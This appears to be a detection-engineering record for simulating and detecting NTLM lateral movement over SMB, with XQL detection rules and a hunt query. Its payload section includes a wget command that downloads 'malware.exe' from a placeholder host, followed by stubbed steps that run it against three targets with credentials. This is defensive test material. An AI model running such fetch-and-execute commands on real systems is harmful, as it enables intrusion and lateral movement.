identity.name: Rare NTLM Usage by User - Lateral Movement via SMB
identity.summary: An attacker uses NTLM authentication to move laterally across the network via SMB connections, triggering the Rare NTLM Usage by User alert. Cortex should detect the unusual NTLM authentication patter
identity.description: An attacker uses NTLM authentication to move laterally across the network via SMB connections, triggering the Rare NTLM Usage by User alert. Cortex should detect the unusual NTLM authentication patterns and related process behaviors.

payload.code:
wget http://192.0.2.50/malware.exe -O /tmp/ntlm_smb.exe
stub chmod +x /tmp/ntlm_smb.exe
stub /tmp/ntlm_smb.exe -t 192.0.2.100 -u user -p password
stub /tmp/ntlm_smb.exe -t 192.0.2.101 -u user -p password
stub /tmp/ntlm_smb.exe -t 192.0.2.102 -u user -p password

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rare NTLM Usage by User
biocs.description: Detection of NTLM authentication attempts by a user outside of normal behavior patterns
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'ntlm_smb.exe'
| filter action_remote_ip in ('192.0.2.100', '192.0.2.101', '192.0.2.102')

abiocs.name: Unusual SMB Authentication Pattern
abiocs.description: Detection of NTLM authentication attempts from user account to multiple targets in short time window
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip in ('192.0.2.100', '192.0.2.101', '192.0.2.102')
| filter dst_port = 445
| filter actor_process_image_name = 'ntlm_smb.exe'

xql_queries.name: NTLM Authentication Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter dst_port = 445
| filter action_remote_ip in ('192.0.2.100', '192.0.2.101', '192.0.2.102')
| filter actor_process_image_name = 'ntlm_smb.exe'
| comp count() by actor_process_image_name, action_remote_ip
